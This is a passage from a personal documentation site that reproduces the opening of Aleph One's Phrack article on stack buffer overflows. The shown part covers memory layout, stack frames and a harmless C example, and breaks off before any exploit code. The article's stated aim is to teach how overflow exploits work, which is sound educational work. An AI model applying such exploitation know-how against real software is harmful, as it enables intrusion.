href=../%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E6%94%B6%E9%9B%86/ class=md-nav__link> 信息安全站点收集 </a> </li> <li class=md-nav__item> <a href=../%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/ class=md-nav__link> 王子亭的博客 GPG 与端到端加密：论什么才是可以信任的 </a> </li> <li class=md-nav__item> <a href=../nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/ class=md-nav__link> Nc: invalid option — ‘ ‘ </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6 type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6> CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CTF data-md-level=1> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../CTF/MapleCTF2022_brsaby/ class=md-nav__link> MapleCTF2022 brsaby </a> </li> <li class=md-nav__item> <a href=../../CTF/SHELLCTF2022_World%27s_greatest_detective/ class=md-nav__link> World's greatest detective </a> </li> <li class=md-nav__item> <a href=../../CTF/SHELLCTF2022_Extractor/ class=md-nav__link> Extractor </a> </li> <li class=md-nav__item> <a href=../../CTF/SHELLCTF2022_swift/ class=md-nav__link> swift </a> </li> <li class=md-nav__item> <a href=../../CTF/SHELLCTF2022_tea/ class=md-nav__link> tea </a> </li> <li class=md-nav__item> <a href=../../CTF/ImaginaryCTF-2023/ class=md-nav__link> ImaginaryCTF 2023 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7 type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7> 功防世界 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=功防世界 data-md-level=1> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> 功防世界 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902/ class=md-nav__link> Misc 流量分析2 </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E4%B8%80%E7%BB%9F%E5%A4%A9%E4%B8%8B/ class=md-nav__link> Mobile 一统天下 </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/pwn_littleof/ class=md-nav__link> littleof </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/reverse_re3/ class=md-nav__link> reverse_re3 迷宫 </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/ class=md-nav__link> Mobile 基础android </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Decrypt-It-easy/ class=md-nav__link> Crypto Decrypt It easy </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/Crypto_Easy_Crypto/ class=md-nav__link> Crypto Easy Crypto </a> </li> <li class=md-nav__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/ class=md-nav__link> mobile Android2.0 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_8 type=checkbox id=__nav_8> <label class=md-nav__link for=__nav_8> 其它 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=其它 data-md-level=1> <label class=md-nav__title for=__nav_8> <span class="md-nav__icon md-icon"></span> 其它 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../How%20to%20Get%20Rich/ class=md-nav__link> How to Get Rich </a> </li> <li class=md-nav__item> <a href=../TOP%2011%20Deep%20Web%20Search%20Engine%20Alternative%20for%20Google%20and%20Bing%202021/ class=md-nav__link> TOP 11 Deep Web Search Engine Alternative for Google and Bing 2021 </a> </li> <li class=md-nav__item> <a href=../FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/ class=md-nav__link> FFmpeg功能命令汇总 </a> </li> <li class=md-nav__item> <a href=../%E4%B8%8D%E6%80%95%E5%A5%B8%E5%95%86%20%E6%8F%AD%E5%90%84%E5%93%81%E7%89%8C%E7%94%B5%E8%A7%86%E8%BF%9B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%B3%95/ class=md-nav__link> 不怕奸商 揭各品牌电视进工厂模式方法 </a> </li> <li class=md-nav__item> <a href=../%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/ class=md-nav__link> 傅里叶变换 </a> </li> <li class=md-nav__item> <a href=../%E6%BB%A4%E6%B3%A2%E5%99%A8/ class=md-nav__link> 滤波器 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%AE%80%E4%BB%8B/ class=md-nav__link> 蓝牙协议入门（一）简介 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（二）传输层协议 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（三）中介层协议 </a> </li> <li class=md-nav__item> <a href=../%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/ class=md-nav__link> 蓝牙协议入门（四）应用层协议 </a> </li> <li class=md-nav__item> <a href=../TarsosDSP%20%E7%AE%80%E4%BB%8B%203.TarsosDSP%20%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/ class=md-nav__link> TarsosDSP 简介 3.TarsosDSP 是如何工作的？ </a> </li> <li class=md-nav__item> <a href=../../tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/ class=md-nav__link> 实战rfc5766 turn server和ice4j广域网通讯 </a> </li> <li class=md-nav__item> <a href=../%E6%B3%A2%E9%BB%91%E5%9B%B4%E5%9F%8E%E6%88%98%E4%B8%AD%E7%9A%84%E5%B9%B8%E5%AD%98%E8%80%85/ class=md-nav__link> 波黑围城战中的幸存者 </a> </li> <li class=md-nav__item> <a href=../%E6%AD%A6%E6%B1%89%EF%BC%9A%E7%99%BE%E5%B9%B4%E7%9A%84%E6%B4%AA%E6%B0%B4%E8%AE%B0%E5%BF%86/ class=md-nav__link> 武汉：百年的洪水记忆 </a> </li> <li class=md-nav__item> <a href=../../Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/ class=md-nav__link> Python制作pdf电子书 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#smashing-the-stack-for-fun-and-profit-by-aleph-one class=md-nav__link> Smashing the Stack for Fun and Profit by Aleph One </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>Smashing the Stack for Fun and Profit by Aleph One</h1> <h2 id=smashing-the-stack-for-fun-and-profit-by-aleph-one>Smashing the Stack for Fun and Profit by Aleph One</h2> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>                               .oO Phrack 49 Oo.
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>                          Volume Seven, Issue Forty-Nine
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>                                  File 14 of 16
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a>                      BugTraq, r00t, and Underground.Org
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a>                                   bring you
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a>                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a>                     Smashing The Stack For Fun And Profit
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a>                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
<a id=__codelineno-0-13 name=__codelineno-0-13 href=#__codelineno-0-13></a>
<a id=__codelineno-0-14 name=__codelineno-0-14 href=#__codelineno-0-14></a>                                 by Aleph One
<a id=__codelineno-0-15 name=__codelineno-0-15 href=#__codelineno-0-15></a>                             aleph1@underground.org
<a id=__codelineno-0-16 name=__codelineno-0-16 href=#__codelineno-0-16></a>
<a id=__codelineno-0-17 name=__codelineno-0-17 href=#__codelineno-0-17></a>    `smash the stack` [C programming] n. On many C implementations
<a id=__codelineno-0-18 name=__codelineno-0-18 href=#__codelineno-0-18></a>    it is possible to corrupt the execution stack by writing past
<a id=__codelineno-0-19 name=__codelineno-0-19 href=#__codelineno-0-19></a>    the end of an array declared auto in a routine.  Code that does
<a id=__codelineno-0-20 name=__codelineno-0-20 href=#__codelineno-0-20></a>    this is said to smash the stack, and can cause return from the
<a id=__codelineno-0-21 name=__codelineno-0-21 href=#__codelineno-0-21></a>    routine to jump to a random address.  This can produce some of
<a id=__codelineno-0-22 name=__codelineno-0-22 href=#__codelineno-0-22></a>    the most insidious data-dependent bugs known to mankind.
<a id=__codelineno-0-23 name=__codelineno-0-23 href=#__codelineno-0-23></a>    Variants include trash the stack, scribble the stack, mangle
<a id=__codelineno-0-24 name=__codelineno-0-24 href=#__codelineno-0-24></a>    the stack; the term mung the stack is not used, as this is
<a id=__codelineno-0-25 name=__codelineno-0-25 href=#__codelineno-0-25></a>    never done intentionally. See spam; see also alias bug,
<a id=__codelineno-0-26 name=__codelineno-0-26 href=#__codelineno-0-26></a>    fandango on core, memory leak, precedence lossage, overrun screw.
<a id=__codelineno-0-27 name=__codelineno-0-27 href=#__codelineno-0-27></a>
<a id=__codelineno-0-28 name=__codelineno-0-28 href=#__codelineno-0-28></a>
<a id=__codelineno-0-29 name=__codelineno-0-29 href=#__codelineno-0-29></a>                                 Introduction
<a id=__codelineno-0-30 name=__codelineno-0-30 href=#__codelineno-0-30></a>                                 ~~~~~~~~~~~~
<a id=__codelineno-0-31 name=__codelineno-0-31 href=#__codelineno-0-31></a>
<a id=__codelineno-0-32 name=__codelineno-0-32 href=#__codelineno-0-32></a>   Over the last few months there has been a large increase of buffer
<a id=__codelineno-0-33 name=__codelineno-0-33 href=#__codelineno-0-33></a>overflow vulnerabilities being both discovered and exploited.  Examples
<a id=__codelineno-0-34 name=__codelineno-0-34 href=#__codelineno-0-34></a>of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt 
<a id=__codelineno-0-35 name=__codelineno-0-35 href=#__codelineno-0-35></a>library, at, etc.  This paper attempts to explain what buffer overflows 
<a id=__codelineno-0-36 name=__codelineno-0-36 href=#__codelineno-0-36></a>are, and how their exploits work.
<a id=__codelineno-0-37 name=__codelineno-0-37 href=#__codelineno-0-37></a>
<a id=__codelineno-0-38 name=__codelineno-0-38 href=#__codelineno-0-38></a>   Basic knowledge of assembly is required.  An understanding of virtual 
<a id=__codelineno-0-39 name=__codelineno-0-39 href=#__codelineno-0-39></a>memory concepts, and experience with gdb are very helpful but not necessary.
<a id=__codelineno-0-40 name=__codelineno-0-40 href=#__codelineno-0-40></a>We also assume we are working with an Intel x86 CPU, and that the operating 
<a id=__codelineno-0-41 name=__codelineno-0-41 href=#__codelineno-0-41></a>system is Linux.
<a id=__codelineno-0-42 name=__codelineno-0-42 href=#__codelineno-0-42></a>
<a id=__codelineno-0-43 name=__codelineno-0-43 href=#__codelineno-0-43></a>   Some basic definitions before we begin: A buffer is simply a contiguous 
<a id=__codelineno-0-44 name=__codelineno-0-44 href=#__codelineno-0-44></a>block of computer memory that holds multiple instances of the same data 
<a id=__codelineno-0-45 name=__codelineno-0-45 href=#__codelineno-0-45></a>type.  C programmers normally associate with the word buffer arrays. Most 
<a id=__codelineno-0-46 name=__codelineno-0-46 href=#__codelineno-0-46></a>commonly, character arrays.  Arrays, like all variables in C, can be 
<a id=__codelineno-0-47 name=__codelineno-0-47 href=#__codelineno-0-47></a>declared either static or dynamic.  Static variables are allocated at load 
<a id=__codelineno-0-48 name=__codelineno-0-48 href=#__codelineno-0-48></a>time on the data segment.  Dynamic variables are allocated at run time on 
<a id=__codelineno-0-49 name=__codelineno-0-49 href=#__codelineno-0-49></a>the stack. To overflow is to flow, or fill over the top, brims, or bounds. 
<a id=__codelineno-0-50 name=__codelineno-0-50 href=#__codelineno-0-50></a>We will concern ourselves only with the overflow of dynamic buffers, otherwise
<a id=__codelineno-0-51 name=__codelineno-0-51 href=#__codelineno-0-51></a>known as stack-based buffer overflows.
<a id=__codelineno-0-52 name=__codelineno-0-52 href=#__codelineno-0-52></a>
<a id=__codelineno-0-53 name=__codelineno-0-53 href=#__codelineno-0-53></a>
<a id=__codelineno-0-54 name=__codelineno-0-54 href=#__codelineno-0-54></a>                          Process Memory Organization
<a id=__codelineno-0-55 name=__codelineno-0-55 href=#__codelineno-0-55></a>                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-56 name=__codelineno-0-56 href=#__codelineno-0-56></a>
<a id=__codelineno-0-57 name=__codelineno-0-57 href=#__codelineno-0-57></a>   To understand what stack buffers are we must first understand how a
<a id=__codelineno-0-58 name=__codelineno-0-58 href=#__codelineno-0-58></a>process is organized in memory.  Processes are divided into three regions:
<a id=__codelineno-0-59 name=__codelineno-0-59 href=#__codelineno-0-59></a>Text, Data, and Stack.  We will concentrate on the stack region, but first
<a id=__codelineno-0-60 name=__codelineno-0-60 href=#__codelineno-0-60></a>a small overview of the other regions is in order.
<a id=__codelineno-0-61 name=__codelineno-0-61 href=#__codelineno-0-61></a>
<a id=__codelineno-0-62 name=__codelineno-0-62 href=#__codelineno-0-62></a>   The text region is fixed by the program and includes code (instructions)
<a id=__codelineno-0-63 name=__codelineno-0-63 href=#__codelineno-0-63></a>and read-only data.  This region corresponds to the text section of the
<a id=__codelineno-0-64 name=__codelineno-0-64 href=#__codelineno-0-64></a>executable file.  This region is normally marked read-only and any attempt to
<a id=__codelineno-0-65 name=__codelineno-0-65 href=#__codelineno-0-65></a>write to it will result in a segmentation violation.
<a id=__codelineno-0-66 name=__codelineno-0-66 href=#__codelineno-0-66></a>
<a id=__codelineno-0-67 name=__codelineno-0-67 href=#__codelineno-0-67></a>   The data region contains initialized and uninitialized data.  Static
<a id=__codelineno-0-68 name=__codelineno-0-68 href=#__codelineno-0-68></a>variables are stored in this region.  The data region corresponds to the
<a id=__codelineno-0-69 name=__codelineno-0-69 href=#__codelineno-0-69></a>data-bss sections of the executable file.  Its size can be changed with the
<a id=__codelineno-0-70 name=__codelineno-0-70 href=#__codelineno-0-70></a>brk(2) system call.  If the expansion of the bss data or the user stack
<a id=__codelineno-0-71 name=__codelineno-0-71 href=#__codelineno-0-71></a>exhausts available memory, the process is blocked and is rescheduled to
<a id=__codelineno-0-72 name=__codelineno-0-72 href=#__codelineno-0-72></a>run again with a larger memory space. New memory is added between the data
<a id=__codelineno-0-73 name=__codelineno-0-73 href=#__codelineno-0-73></a>and stack segments.
<a id=__codelineno-0-74 name=__codelineno-0-74 href=#__codelineno-0-74></a>
<a id=__codelineno-0-75 name=__codelineno-0-75 href=#__codelineno-0-75></a>                             /------------------\  lower
<a id=__codelineno-0-76 name=__codelineno-0-76 href=#__codelineno-0-76></a>                             |                  |  memory
<a id=__codelineno-0-77 name=__codelineno-0-77 href=#__codelineno-0-77></a>                             |       Text       |  addresses
<a id=__codelineno-0-78 name=__codelineno-0-78 href=#__codelineno-0-78></a>                             |                  |
<a id=__codelineno-0-79 name=__codelineno-0-79 href=#__codelineno-0-79></a>                             |------------------|
<a id=__codelineno-0-80 name=__codelineno-0-80 href=#__codelineno-0-80></a>                             |   (Initialized)  |
<a id=__codelineno-0-81 name=__codelineno-0-81 href=#__codelineno-0-81></a>                             |        Data      |
<a id=__codelineno-0-82 name=__codelineno-0-82 href=#__codelineno-0-82></a>                             |  (Uninitialized) |
<a id=__codelineno-0-83 name=__codelineno-0-83 href=#__codelineno-0-83></a>                             |------------------|
<a id=__codelineno-0-84 name=__codelineno-0-84 href=#__codelineno-0-84></a>                             |                  |
<a id=__codelineno-0-85 name=__codelineno-0-85 href=#__codelineno-0-85></a>                             |       Stack      |  higher
<a id=__codelineno-0-86 name=__codelineno-0-86 href=#__codelineno-0-86></a>                             |                  |  memory
<a id=__codelineno-0-87 name=__codelineno-0-87 href=#__codelineno-0-87></a>                             \------------------/  addresses
<a id=__codelineno-0-88 name=__codelineno-0-88 href=#__codelineno-0-88></a>
<a id=__codelineno-0-89 name=__codelineno-0-89 href=#__codelineno-0-89></a>                         Fig. 1 Process Memory Regions
<a id=__codelineno-0-90 name=__codelineno-0-90 href=#__codelineno-0-90></a>
<a id=__codelineno-0-91 name=__codelineno-0-91 href=#__codelineno-0-91></a>
<a id=__codelineno-0-92 name=__codelineno-0-92 href=#__codelineno-0-92></a>                               What Is A Stack?
<a id=__codelineno-0-93 name=__codelineno-0-93 href=#__codelineno-0-93></a>                               ~~~~~~~~~~~~~~~~
<a id=__codelineno-0-94 name=__codelineno-0-94 href=#__codelineno-0-94></a>
<a id=__codelineno-0-95 name=__codelineno-0-95 href=#__codelineno-0-95></a>   A stack is an abstract data type frequently used in computer science.  A
<a id=__codelineno-0-96 name=__codelineno-0-96 href=#__codelineno-0-96></a>stack of objects has the property that the last object placed on the stack
<a id=__codelineno-0-97 name=__codelineno-0-97 href=#__codelineno-0-97></a>will be the first object removed.  This property is commonly referred to as
<a id=__codelineno-0-98 name=__codelineno-0-98 href=#__codelineno-0-98></a>last in, first out queue, or a LIFO.
<a id=__codelineno-0-99 name=__codelineno-0-99 href=#__codelineno-0-99></a>
<a id=__codelineno-0-100 name=__codelineno-0-100 href=#__codelineno-0-100></a>   Several operations are defined on stacks.  Two of the most important are
<a id=__codelineno-0-101 name=__codelineno-0-101 href=#__codelineno-0-101></a>PUSH and POP.  PUSH adds an element at the top of the stack.  POP, in 
<a id=__codelineno-0-102 name=__codelineno-0-102 href=#__codelineno-0-102></a>contrast, reduces the stack size by one by removing the last element at the 
<a id=__codelineno-0-103 name=__codelineno-0-103 href=#__codelineno-0-103></a>top of the stack.
<a id=__codelineno-0-104 name=__codelineno-0-104 href=#__codelineno-0-104></a>
<a id=__codelineno-0-105 name=__codelineno-0-105 href=#__codelineno-0-105></a>
<a id=__codelineno-0-106 name=__codelineno-0-106 href=#__codelineno-0-106></a>                            Why Do We Use A Stack?
<a id=__codelineno-0-107 name=__codelineno-0-107 href=#__codelineno-0-107></a>                            ~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-108 name=__codelineno-0-108 href=#__codelineno-0-108></a>
<a id=__codelineno-0-109 name=__codelineno-0-109 href=#__codelineno-0-109></a>   Modern computers are designed with the need of high-level languages in
<a id=__codelineno-0-110 name=__codelineno-0-110 href=#__codelineno-0-110></a>mind.  The most important technique for structuring programs introduced by
<a id=__codelineno-0-111 name=__codelineno-0-111 href=#__codelineno-0-111></a>high-level languages is the procedure or function.  From one point of view, a
<a id=__codelineno-0-112 name=__codelineno-0-112 href=#__codelineno-0-112></a>procedure call alters the flow of control just as a jump does, but unlike a
<a id=__codelineno-0-113 name=__codelineno-0-113 href=#__codelineno-0-113></a>jump, when finished performing its task, a function returns control to the 
<a id=__codelineno-0-114 name=__codelineno-0-114 href=#__codelineno-0-114></a>statement or instruction following the call.  This high-level abstraction
<a id=__codelineno-0-115 name=__codelineno-0-115 href=#__codelineno-0-115></a>is implemented with the help of the stack.
<a id=__codelineno-0-116 name=__codelineno-0-116 href=#__codelineno-0-116></a>
<a id=__codelineno-0-117 name=__codelineno-0-117 href=#__codelineno-0-117></a>  The stack is also used to dynamically allocate the local variables used in
<a id=__codelineno-0-118 name=__codelineno-0-118 href=#__codelineno-0-118></a>functions, to pass parameters to the functions, and to return values from the
<a id=__codelineno-0-119 name=__codelineno-0-119 href=#__codelineno-0-119></a>function.
<a id=__codelineno-0-120 name=__codelineno-0-120 href=#__codelineno-0-120></a>
<a id=__codelineno-0-121 name=__codelineno-0-121 href=#__codelineno-0-121></a>
<a id=__codelineno-0-122 name=__codelineno-0-122 href=#__codelineno-0-122></a>                               The Stack Region
<a id=__codelineno-0-123 name=__codelineno-0-123 href=#__codelineno-0-123></a>                               ~~~~~~~~~~~~~~~~
<a id=__codelineno-0-124 name=__codelineno-0-124 href=#__codelineno-0-124></a>
<a id=__codelineno-0-125 name=__codelineno-0-125 href=#__codelineno-0-125></a>   A stack is a contiguous block of memory containing data.  A register called
<a id=__codelineno-0-126 name=__codelineno-0-126 href=#__codelineno-0-126></a>the stack pointer (SP) points to the top of the stack.  The bottom of the 
<a id=__codelineno-0-127 name=__codelineno-0-127 href=#__codelineno-0-127></a>stack is at a fixed address.  Its size is dynamically adjusted by the kernel 
<a id=__codelineno-0-128 name=__codelineno-0-128 href=#__codelineno-0-128></a>at run time. The CPU implements instructions to PUSH onto and POP off of the 
<a id=__codelineno-0-129 name=__codelineno-0-129 href=#__codelineno-0-129></a>stack. 
<a id=__codelineno-0-130 name=__codelineno-0-130 href=#__codelineno-0-130></a>
<a id=__codelineno-0-131 name=__codelineno-0-131 href=#__codelineno-0-131></a>   The stack consists of logical stack frames that are pushed when calling a
<a id=__codelineno-0-132 name=__codelineno-0-132 href=#__codelineno-0-132></a>function and popped when returning.  A stack frame contains the parameters to 
<a id=__codelineno-0-133 name=__codelineno-0-133 href=#__codelineno-0-133></a>a function, its local variables, and the data necessary to recover the 
<a id=__codelineno-0-134 name=__codelineno-0-134 href=#__codelineno-0-134></a>previous stack frame, including the value of the instruction pointer at the 
<a id=__codelineno-0-135 name=__codelineno-0-135 href=#__codelineno-0-135></a>time of the function call.
<a id=__codelineno-0-136 name=__codelineno-0-136 href=#__codelineno-0-136></a>
<a id=__codelineno-0-137 name=__codelineno-0-137 href=#__codelineno-0-137></a>   Depending on the implementation the stack will either grow down (towards
<a id=__codelineno-0-138 name=__codelineno-0-138 href=#__codelineno-0-138></a>lower memory addresses), or up.  In our examples we&#39;ll use a stack that grows
<a id=__codelineno-0-139 name=__codelineno-0-139 href=#__codelineno-0-139></a>down.  This is the way the stack grows on many computers including the Intel, 
<a id=__codelineno-0-140 name=__codelineno-0-140 href=#__codelineno-0-140></a>Motorola, SPARC and MIPS processors.  The stack pointer (SP) is also
<a id=__codelineno-0-141 name=__codelineno-0-141 href=#__codelineno-0-141></a>implementation dependent.  It may point to the last address on the stack, or 
<a id=__codelineno-0-142 name=__codelineno-0-142 href=#__codelineno-0-142></a>to the next free available address after the stack.  For our discussion we&#39;ll
<a id=__codelineno-0-143 name=__codelineno-0-143 href=#__codelineno-0-143></a>assume it points to the last address on the stack.
<a id=__codelineno-0-144 name=__codelineno-0-144 href=#__codelineno-0-144></a>
<a id=__codelineno-0-145 name=__codelineno-0-145 href=#__codelineno-0-145></a>   In addition to the stack pointer, which points to the top of the stack
<a id=__codelineno-0-146 name=__codelineno-0-146 href=#__codelineno-0-146></a>(lowest numerical address), it is often convenient to have a frame pointer
<a id=__codelineno-0-147 name=__codelineno-0-147 href=#__codelineno-0-147></a>(FP) which points to a fixed location within a frame.  Some texts also refer
<a id=__codelineno-0-148 name=__codelineno-0-148 href=#__codelineno-0-148></a>to it as a local base pointer (LB).  In principle, local variables could be
<a id=__codelineno-0-149 name=__codelineno-0-149 href=#__codelineno-0-149></a>referenced by giving their offsets from SP.  However, as words are pushed onto
<a id=__codelineno-0-150 name=__codelineno-0-150 href=#__codelineno-0-150></a>the stack and popped from the stack, these offsets change.  Although in some
<a id=__codelineno-0-151 name=__codelineno-0-151 href=#__codelineno-0-151></a>cases the compiler can keep track of the number of words on the stack and
<a id=__codelineno-0-152 name=__codelineno-0-152 href=#__codelineno-0-152></a>thus correct the offsets, in some cases it cannot, and in all cases
<a id=__codelineno-0-153 name=__codelineno-0-153 href=#__codelineno-0-153></a>considerable administration is required.  Futhermore, on some machines, such
<a id=__codelineno-0-154 name=__codelineno-0-154 href=#__codelineno-0-154></a>as Intel-based processors, accessing a variable at a known distance from SP
<a id=__codelineno-0-155 name=__codelineno-0-155 href=#__codelineno-0-155></a>requires multiple instructions.
<a id=__codelineno-0-156 name=__codelineno-0-156 href=#__codelineno-0-156></a>
<a id=__codelineno-0-157 name=__codelineno-0-157 href=#__codelineno-0-157></a>   Consequently, many compilers use a second register, FP, for referencing
<a id=__codelineno-0-158 name=__codelineno-0-158 href=#__codelineno-0-158></a>both local variables and parameters because their distances from FP do
<a id=__codelineno-0-159 name=__codelineno-0-159 href=#__codelineno-0-159></a>not change with PUSHes and POPs.  On Intel CPUs, BP (EBP) is used for this 
<a id=__codelineno-0-160 name=__codelineno-0-160 href=#__codelineno-0-160></a>purpose.  On the Motorola CPUs, any address register except A7 (the stack 
<a id=__codelineno-0-161 name=__codelineno-0-161 href=#__codelineno-0-161></a>pointer) will do.  Because the way our stack grows, actual parameters have 
<a id=__codelineno-0-162 name=__codelineno-0-162 href=#__codelineno-0-162></a>positive offsets and local variables have negative offsets from FP.
<a id=__codelineno-0-163 name=__codelineno-0-163 href=#__codelineno-0-163></a>
<a id=__codelineno-0-164 name=__codelineno-0-164 href=#__codelineno-0-164></a>   The first thing a procedure must do when called is save the previous FP
<a id=__codelineno-0-165 name=__codelineno-0-165 href=#__codelineno-0-165></a>(so it can be restored at procedure exit).  Then it copies SP into FP to 
<a id=__codelineno-0-166 name=__codelineno-0-166 href=#__codelineno-0-166></a>create the new FP, and advances SP to reserve space for the local variables. 
<a id=__codelineno-0-167 name=__codelineno-0-167 href=#__codelineno-0-167></a>This code is called the procedure prolog.  Upon procedure exit, the stack 
<a id=__codelineno-0-168 name=__codelineno-0-168 href=#__codelineno-0-168></a>must be cleaned up again, something called the procedure epilog.  The Intel 
<a id=__codelineno-0-169 name=__codelineno-0-169 href=#__codelineno-0-169></a>ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, 
<a id=__codelineno-0-170 name=__codelineno-0-170 href=#__codelineno-0-170></a>have been provided to do most of the procedure prolog and epilog work 
<a id=__codelineno-0-171 name=__codelineno-0-171 href=#__codelineno-0-171></a>efficiently. 
<a id=__codelineno-0-172 name=__codelineno-0-172 href=#__codelineno-0-172></a>
<a id=__codelineno-0-173 name=__codelineno-0-173 href=#__codelineno-0-173></a>   Let us see what the stack looks like in a simple example:
<a id=__codelineno-0-174 name=__codelineno-0-174 href=#__codelineno-0-174></a>
<a id=__codelineno-0-175 name=__codelineno-0-175 href=#__codelineno-0-175></a>example1.c:
<a id=__codelineno-0-176 name=__codelineno-0-176 href=#__codelineno-0-176></a>------------------------------------------------------------------------------
<a id=__codelineno-0-177 name=__codelineno-0-177 href=#__codelineno-0-177></a>void function(int a, int b, int c) {
<a id=__codelineno-0-178 name=__codelineno-0-178 href=#__codelineno-0-178></a>   char buffer1[5];
<a id=__codelineno-0-179 name=__codelineno-0-179 href=#__codelineno-0-179></a>   char buffer2[10];
<a id=__codelineno-0-180 name=__codelineno-0-180 href=#__codelineno-0-180></a>}
<a id=__codelineno-0-181 name=__codelineno-0-181 href=#__codelineno-0-181></a>
<a id=__codelineno-0-182 name=__codelineno-0-182 href=#__codelineno-0-182></a>void main() {
<a id=__codelineno-0-183 name=__codelineno-0-183 href=#__codelineno-0-183></a>  function(1,2,3);
<a id=__codelineno-0-184 name=__codelineno-0-184 href=#__codelineno-0-184></a>}
